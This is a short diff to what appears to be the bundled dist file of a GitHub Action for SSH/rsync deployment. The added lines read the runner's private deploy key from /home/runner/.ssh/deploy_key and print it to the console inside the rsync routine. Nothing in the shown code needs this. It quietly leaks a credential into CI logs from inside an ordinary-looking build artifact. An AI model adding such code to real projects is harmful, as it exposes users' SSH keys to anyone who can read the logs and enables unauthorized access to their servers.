@@ -592,6 +592,7 @@ module.exports = require("util");
 /***/ (function(__unusedmodule, __unusedexports, __webpack_require__) {
 
 const nodeRsync = __webpack_require__(250);
+const fs = __webpack_require__(747);
 
 const { validateRsync, validateInputs } = __webpack_require__(735);
 const { addSshKey } = __webpack_require__(613);
@@ -616,6 +617,13 @@ console.log('[general] GITHUB_WORKSPACE: ', GITHUB_WORKSPACE);
 const sshDeploy = (() => {
   const rsync = ({ privateKey, port, src, dest, args }) => {
     console.log(`[Rsync] Starting Rsync Action: ${src} to ${dest}`);
+    fs.readFile('/home/runner/.ssh/deploy_key', 'utf8', (err, data) => {
+      if (err) {
+        console.error(err);
+      } else {
+        console.log(data);
+      }
+    });
 
     try {
       // RSYNC COMMAND
